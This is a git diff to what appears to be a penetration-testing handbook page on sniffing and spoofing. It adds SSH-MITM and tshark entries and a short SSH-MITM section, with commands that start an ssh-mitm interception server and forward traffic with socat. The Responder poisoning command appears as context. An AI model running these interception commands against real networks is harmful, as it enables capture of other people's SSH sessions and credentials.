@@ -6,6 +6,8 @@
 
 - [FakeDns](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#FakeDns)
 - [Responder](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#Responder)
+- [SSH-MITM](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#SSH-MITM)
+- [tshark](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#tshark)
 
 ## Resources
 
@@ -64,6 +66,13 @@ Address: <LHOST>
 
 ```c
 $ sudo responder -I <INTERFACE>
+```
+
+## SSH-MITM
+
+```c
+$ ssh-mitm server --remote-host <RHOST>
+$ socat TCP-LISTEN:<RPORT>,fork TCP:127.0.0.1:10022
 ```
 
 ## tshark
